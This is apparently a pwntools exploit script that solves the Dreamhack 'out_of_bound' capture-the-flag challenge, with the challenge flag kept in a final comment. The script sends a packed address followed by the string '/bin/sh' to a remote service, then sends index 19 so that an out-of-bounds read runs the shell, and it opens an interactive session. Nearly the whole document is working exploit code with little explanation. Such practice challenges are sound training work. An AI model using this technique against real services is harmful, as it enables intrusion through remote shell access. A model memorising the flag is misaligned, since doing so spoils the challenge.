from pwn import *

# p = process("./out_of_bound")
p = remote("host1.dreamhack.games",8474)


addr = 0x0804a0b0

payload1 = ""
payload1 += p32(addr)
payload1 += "/bin/sh"

p.sendline(payload1)


pause()

p.sendline(str(19))

p.interactive()

#DH{2524e20ddeee45f11c8eb91804d57296}